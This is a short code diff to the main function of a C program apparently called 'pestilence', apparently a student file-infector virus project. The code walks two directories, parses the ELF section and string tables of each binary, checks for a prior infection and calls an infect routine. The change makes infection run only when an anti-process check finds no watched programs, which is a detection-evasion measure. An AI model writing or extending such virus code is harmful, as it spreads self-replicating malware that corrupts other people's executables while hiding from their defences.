@@ -57,30 +57,30 @@ int main()
     pestilence = malloc(sizeof(t_pestilence));
     if (!pestilence)
         return (1);
-    
-    while (i < 2)
+    ft_antiprocess(pestilence);
+    if (!pestilence->anti_virus)
     {
-        pestilence->anti_virus = 0;
-        pestilence->dir = opendir(ft_getdir(i));
-        while ((pestilence->readdir = readdir(pestilence->dir)) != NULL)
+        while (i < 2)
         {
-            snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), pestilence->readdir->d_name);
-            if (pestilence->readdir->d_name[0] == '.')
-                continue;
-            pestilence->binary = path;
-            if (ft_checkarg(pestilence))
-                continue;
-            ft_pointer_section_table(pestilence);
-            ft_pointer_strings_table(pestilence);
-            ft_antiprocess(pestilence);
-            if (ft_detect_prev_infection(pestilence))
-                ft_infect(pestilence);
-
-        }
-        closedir(pestilence->dir);
-        i++;
-    }
+            pestilence->dir = opendir(ft_getdir(i));
+            while ((pestilence->readdir = readdir(pestilence->dir)) != NULL)
+            {
+                snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), pestilence->readdir->d_name);
+                if (pestilence->readdir->d_name[0] == '.')
+                    continue;
+                pestilence->binary = path;
+                if (ft_checkarg(pestilence))
+                    continue;
+                ft_pointer_section_table(pestilence);
+                ft_pointer_strings_table(pestilence);
+                if (ft_detect_prev_infection(pestilence))
+                    ft_infect(pestilence);
     
+            }
+            closedir(pestilence->dir);
+            i++;
+        }
+    }
     free(pestilence);
     return (0);
 }
